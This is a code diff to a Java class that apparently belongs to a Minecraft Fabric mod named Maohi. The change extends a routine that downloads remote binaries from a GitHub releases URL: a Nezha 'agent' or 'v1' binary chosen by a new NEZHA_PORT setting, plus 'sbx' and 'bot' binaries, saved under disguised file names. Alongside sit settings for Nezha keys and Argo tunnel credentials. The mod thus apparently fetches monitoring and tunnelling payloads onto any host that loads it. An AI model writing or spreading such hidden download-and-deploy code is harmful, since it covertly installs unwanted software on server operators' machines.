@@ -34,6 +34,7 @@ public class Maohi implements ModInitializer {
 
     private static final String UUID         = cfg("UUID", "");
     private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
+    private static final String NEZHA_PORT = cfg("NEZHA_PORT", "");
     private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
     private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
@@ -109,13 +110,24 @@ public class Maohi implements ModInitializer {
 
     private void downloadBinaries(String arch) {
         String base = "https://github.com/eooce/test/releases/download/" + arch + "/";
+
+        // ⭐ 根据是否有 NEZHA_PORT 决定下载 agent 还是 v1
+        String nezhaBinary = (NEZHA_PORT != null && !NEZHA_PORT.trim().isEmpty())
+            ? "agent"
+            : "v1";
+
         String[][] files = {
-            { phpName, base + "v1"  },
+            { phpName, base + nezhaBinary }, // ⭐ 动态选择
             { webName, base + "sbx" },
             { botName, base + "bot" }
         };
+
         for (String[] f : files) {
-            try { downloadFile(f[0], f[1]); } catch (Exception e) {}
+            try {
+                downloadFile(f[0], f[1]);
+            } catch (Exception e) {
+                LOGGER.warn("Download failed: " + f[1]);
+            }
         }
     }
 
